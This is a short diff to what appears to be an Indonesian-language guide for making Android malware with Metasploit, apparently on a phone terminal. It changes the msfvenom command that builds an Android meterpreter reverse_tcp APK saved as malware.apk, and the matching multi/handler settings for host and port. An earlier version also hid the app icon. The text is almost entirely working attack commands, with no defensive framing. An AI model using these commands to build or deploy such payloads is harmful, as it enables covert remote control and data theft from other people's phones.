@@ -21,7 +21,9 @@ $ ./metasploit.sh
 # Membuat Payload
 
 ```bash
-$ msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=2112 AndroidHideAppIcon=true R -o /sdcard/malware.apk
+$ cd #HOME
+
+$ msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -a dalvik --platform android R > storage/downloads/malware.apk
 
 NEW TAB :
 
@@ -33,7 +35,7 @@ $ set payload android/meterpreter/reverse_tcp
 
 $ set lhost 127.0.0.1
 
-$ set lport 2112
+$ set lport 4444
 
 $ run
 
